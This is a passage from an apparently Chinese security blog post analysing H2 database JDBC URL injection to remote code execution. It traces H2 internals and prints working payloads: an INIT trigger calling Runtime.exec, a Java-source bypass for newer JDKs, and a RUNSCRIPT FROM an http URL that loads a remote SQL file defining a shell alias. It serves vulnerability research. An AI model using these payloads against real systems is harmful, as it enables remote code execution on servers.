</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;org.h2.Driver&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">simplexp2</span><span class="w"> </span><span class="o">=</span><span class="s">&#34;jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS &#39;//javascript\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;Java.type(\&#34;java.lang.Runtime\&#34;).getRuntime().exec(\&#34;calc\&#34;)&#39;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="na">sql</span><span class="p">.</span><span class="na">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">simplexp2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h3 id="h2解析流程">H2解析流程<a hidden class="anchor" aria-hidden="true" href="#h2解析流程">#</a></h3>
<p>先是<code>url</code>，这里<code>ConnectionInfo#readSettingsFromURL</code>会对<code>this.url</code>做处理，原始传入的<code>String u(demo中的simplexp2)</code>在<code>;</code>前的值覆盖给<code>this.url</code>，后面的值再通过<code>;</code>分割成一个<code>array</code>，每组会进行<code>=</code>查找，没有找到会报错</p>
<p><img loading="lazy" src="images/image-20250208174238289.png" alt="image-20250208174238289"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readSettingsFromURL</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">DbSettings</span><span class="w"> </span><span class="n">defaultSettings</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DbSettings</span><span class="p">.</span><span class="na">getDefaultSettings</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="na">indexOf</span><span class="p">(</span><span class="sc">&#39;;&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">settings</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">url</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">url</span><span class="p">.</span><span class="na">substring</span><span class="p">(</span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">idx</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">StringUtils</span><span class="p">.</span><span class="na">arraySplit</span><span class="p">(</span><span class="n">settings</span><span class="p">,</span><span class="w"> </span><span class="sc">&#39;;&#39;</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">setting</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">list</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">setting</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">continue</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kt">int</span><span class="w"> </span><span class="n">equal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">setting</span><span class="p">.</span><span class="na">indexOf</span><span class="p">(</span><span class="sc">&#39;=&#39;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">equal</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">throw</span><span class="w"> </span><span class="n">getFormatException</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">...</span><span class="w">
</span></span></span></code></pre></div><p><code>name</code>是url中后半段值，然后进入<code>parseName()</code></p>
<p><img loading="lazy" src="images/image-20250208175522599.png" alt="image-20250208175522599"  />
</p>
<p>我们这里是<code>mem:test</code>，会让<code>persistent = false;</code></p>
<p><code>tcp:</code>和<code>ssl:</code>会开启远程remote=true，后面一处remote的判断会进行远程连接</p>
<p><img loading="lazy" src="images/image-20250208175744616.png" alt="image-20250208175744616"  />
</p>
<p>上面让<code>persistent = false;</code>是有用的，后面调用<code>getName()</code>时，可以直接返回<code>name</code>（下图我用的<code>mem</code>，所以persistent = false），不然name不符合下面格式会被throw</p>
<p><img loading="lazy" src="images/image-20250211092042768.png" alt="image-20250211092042768"  />
</p>
<h3 id="init"><strong>init</strong><a hidden class="anchor" aria-hidden="true" href="#init">#</a></h3>
<p><code>Engine#openSession</code></p>
<p>这里获取到我们设置的<code>INIT</code>，然后进入<code>session.prepareCommand</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">init</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ci</span><span class="p">.</span><span class="na">removeProperty</span><span class="p">(</span><span class="s">&#34;INIT&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250208182000161.png" alt="image-20250208182000161"  />
</p>
<p>后面h2读取sql命令进行赋值，前面还有很多赋值，这里记录<code>triggerSource</code>的设置</p>
<p><img loading="lazy" src="images/image-20250208183828837.png" alt="image-20250208183828837"  />
</p>
<p>然后返回，<code>command</code>初始化完成</p>
<p><img loading="lazy" src="images/image-20250208184017525.png" alt="image-20250208184017525"  />
</p>
<p>然后来到<code>loadFromSource()</code>，调用执行</p>
<p><img loading="lazy" src="images/image-20250208184227295.png" alt="image-20250208184227295"  />
</p>
<p>利用点在<code>org.h2.schema.TriggerObject#loadFromSource</code>，这里会检验<code>triggerSource</code>，是以<code>//javascript</code>开头会调用下面<code>eval()</code></p>
<p><img loading="lazy" src="images/image-20250208165741347.png" alt="image-20250208165741347"  />
</p>
<p>判断开头</p>
<p><img loading="lazy" src="images/image-20250208165718060.png" alt="image-20250208165718060"  />
</p>
<p>然后先进入<code>getCompiledScript()</code>，这里JDK15 中 <code>JavaScript /Nashorn</code>引擎被彻底移除(也就是jdk15以上用不了<code>//javascript</code>这种方式rce，<code>jsEngine会为null</code>然后空指针报错)</p>
<p><img loading="lazy" src="images/image-20250208165424683.png" alt="image-20250208165424683"  />
</p>
<p>下图为jdk17版本，<code>jsEngine会为null</code>，下一步就会报错中断</p>
<p><img loading="lazy" src="images/image-20250208171417893.png" alt="image-20250208171417893"  />
</p>
<p>回到上文<code>new ScriptEngineManager().getEngineByName(lang);</code>看他是怎么获取</p>
<p>看到<code>names</code></p>
<blockquote>
<p>&ldquo;nashorn&rdquo;, &ldquo;Nashorn&rdquo;, &ldquo;js&rdquo;, &ldquo;JS&rdquo;, &ldquo;JavaScript&quot;等</p>
</blockquote>
<p><img loading="lazy" src="images/image-20250208170339940.png" alt="image-20250208170339940"  />
</p>
<p>然后<code>names</code>和我们传入的<code>name</code>进行匹对，匹配到返回初始化的engine</p>
<p><img loading="lazy" src="images/image-20250208171729713.png" alt="image-20250208171729713"  />
</p>
<blockquote>
<p>这里找到javascript就会return，那是不是当<code>javascript被黑名单</code>的时候可以利用上面这些进行绕过呢？</p>
<p>其实不然hhhh，因为走到这之前就严格对//javascript前缀进行了匹对，且lang也是被限制的</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isJavascriptSource</span><span class="p">(</span><span class="n">source</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">lang</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;javascript&#34;</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></div></blockquote>
<h2 id="0x02-绕过javascript">0x02 绕过//javascript<a hidden class="anchor" aria-hidden="true" href="#0x02-绕过javascript">#</a></h2>
<p>上面不是说了么，JDK15之后用不了javascript了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">simplexp2</span><span class="w"> </span><span class="o">=</span><span class="s">&#34;jdbc:h2:mem:test;init=CREATE TRIGGER TRIG_JS AFTER INSERT ON INFORMATION_SCHEMA.TABLES AS $$ void shell() throws Exception {\n&#34;</span><span class="w"> </span><span class="o">+</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="s">&#34;java.lang.Runtime.getRuntime().exec(\&#34;calc\&#34;)\\;}$$&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="na">sql</span><span class="p">.</span><span class="na">Connection</span><span class="w"> </span><span class="n">conn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DriverManager</span><span class="p">.</span><span class="na">getConnection</span><span class="p">(</span><span class="n">simplexp2</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//BEFORE SELECT ON</span><span class="w">
</span></span></span></code></pre></div><p>这里有个细节，shell函数里那个<code>;</code>要<code>转义</code>，不然会被当成<code>h2初始化的参数分割符</code>，导致<code>}$$</code>会被切割掉</p>
<h3 id="简单分析下"><strong>简单分析下</strong><a hidden class="anchor" aria-hidden="true" href="#简单分析下">#</a></h3>
<p>这里跟进到<code>TRIGGER</code>关键字，这个关联后面设置<code>this.triggerSource</code></p>
<p><img loading="lazy" src="images/image-20250211164143836.png" alt="image-20250211164143836"  />
</p>
<p><img loading="lazy" src="images/image-20250211164545508.png" alt="image-20250211164545508"  />
</p>
<p>然后我们直接跟到<code>compiler.getMethod()</code>这步</p>
<p><img loading="lazy" src="images/image-20250211164756908.png" alt="image-20250211164756908"  />
</p>
<p>在跟进<code>getClass(className);</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="nf">getMethod</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">className</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ClassNotFoundException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="w"> </span><span class="n">clazz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getClass</span><span class="p">(</span><span class="n">className</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Method</span><span class="o">[]</span><span class="w"> </span><span class="n">methods</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">clazz</span><span class="p">.</span><span class="na">getDeclaredMethods</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">...</span><span class="w">
</span></span></span></code></pre></div><p>这里上面代码获取都是<code>null</code>，然后直接到<code>classLoader.loadClass(packageAndClassName)；</code></p>
<p>这里<code>classLoader</code>是<code>SourceCompiler</code>这个类本身，<code>loadClass()</code>里面会调用<code>findClass()</code>来查找类，也就会调用下方的<code>findClass方法</code>，主要逻辑就在这</p>
<p><img loading="lazy" src="images/image-20250211165118256.png" alt="image-20250211165118256"  />
</p>
<p>先是这里<code>getCompleteSourceCode()</code>会<code>补全</code>完整的class文件的<code>代码</code>，<code>source</code>就是<code>上面shell函数那段代码</code></p>
<p>然后通过<code>javaxToolsJavac</code>去加载那个class，然后put到一个map中，并<code>返回</code>这个<code>class对象</code></p>
<p><img loading="lazy" src="images/image-20250211165716436.png" alt="image-20250211165716436"  />
</p>
<p>然后就是水到渠成啦，调用invoke触发恶意方法</p>
<p><img loading="lazy" src="images/image-20250211170227498.png" alt="image-20250211170227498"  />
</p>
<h2 id="0x03-init-runscript-rce">0x03 INIT RunScript RCE<a hidden class="anchor" aria-hidden="true" href="#0x03-init-runscript-rce">#</a></h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nl">jdbc</span><span class="p">:</span><span class="n">h2</span><span class="p">:</span><span class="n">mem</span><span class="p">:</span><span class="n">testdb</span><span class="p">;</span><span class="n">TRACE_LEVEL_SYSTEM_OUT</span><span class="o">=</span><span class="n">3</span><span class="p">;</span><span class="n">INIT</span><span class="o">=</span><span class="n">RUNSCRIPT</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="err">&#39;</span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1:8000/poc.sql&#39;</span><span class="w">
</span></span></span></code></pre></div><p>poc.sql</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">DROP</span><span class="w"> </span><span class="n">ALIAS</span><span class="w"> </span><span class="n">IF</span><span class="w"> </span><span class="n">EXISTS</span><span class="w"> </span><span class="n">shell</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">CREATE</span><span class="w"> </span><span class="n">ALIAS</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">AS</span><span class="w"> </span><span class="n">$$void</span><span class="w"> </span><span class="nf">shell</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="n">$$</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SELECT</span><span class="w"> </span><span class="nf">shell</span><span class="p">(</span><span class="err">&#39;</span><span class="n">cmd</span><span class="w"> </span><span class="o">/</span><span class="n">c</span><span class="w"> </span><span class="n">calc</span><span class="err">&#39;</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><code>RunScriptCommand#update</code>中，远程poc.sql存储在<code>in</code>中，然后通过while循环执行每一条sql语句，一次执行一条</p>
<p><img loading="lazy" src="images/image-20250211093337671.png" alt="image-20250211093337671"  />
</p>
<h3 id="逻辑">$$逻辑<a hidden class="anchor" aria-hidden="true" href="#逻辑">#</a></h3>
<p>初始化，通过<code>CHAR_DOLLAR_QUOTED_STRING</code>(值为9)，作为占位符</p>
<p><img loading="lazy" src="images/image-20250211114152451.png" alt="image-20250211114152451"  />
</p>
<p>read的时候通过匹对<code>CHAR_DOLLAR_QUOTED_STRING</code>，得到<code>末位index</code>，然后截取字符串得到我们的<code>函数内容</code></p>
<p><img loading="lazy" src="images/image-20250211095611540.png" alt="image-20250211095611540"  />
</p>
<h3 id="绕过">绕过$<a hidden class="anchor" aria-hidden="true" href="#绕过">#</a></h3>
<p>然后查看相关代码，发现这里用<code>'</code>也是可以代替<code>$</code>的，但是<code>&quot;</code>以及<code>其他字符</code>就不好利用了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">H2中&#34;和`包裹的字符，会被当成字段，read()后会查询这个字段是否存在。所以这里&#34;双引号代替不了
</span></span></code></pre></div><p>还有一点是远程获取的问题</p>
<p>看到<code>r.readStatement();</code>，看下他远程获取的逻辑</p>
<p><img loading="lazy" src="images/image-20250211114903873.png" alt="image-20250211114903873"  />
</p>
<p>逻辑在<code>ScriptReader#readStatementLoop</code></p>
<p>可以看到正常情况读取到<code>;</code>就会结束，但是我们java函数代码语句是需要<code>;</code>后面那个<code>}</code>就会被截断掉</p>
<p>而这里只有<code>'，&quot;，$$，/**/,--</code>会一直读取，其包裹的内容</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">readStatementLoop</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">bufferStart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bufferPos</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">endOfFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">bufferPos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">1</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">bufferStart</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;;&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;$&#39;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;$&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">bufferPos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">bufferStart</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">3</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">buffer</span><span class="o">[</span><span class="n">bufferPos</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">3</span><span class="o">]</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="sc">&#39; &#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="c1">// dollar quoted string</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;$&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;$&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;\&#39;&#39;</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\&#39;&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;&#34;&#39;</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="sc">&#39;\&#34;&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;/&#39;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
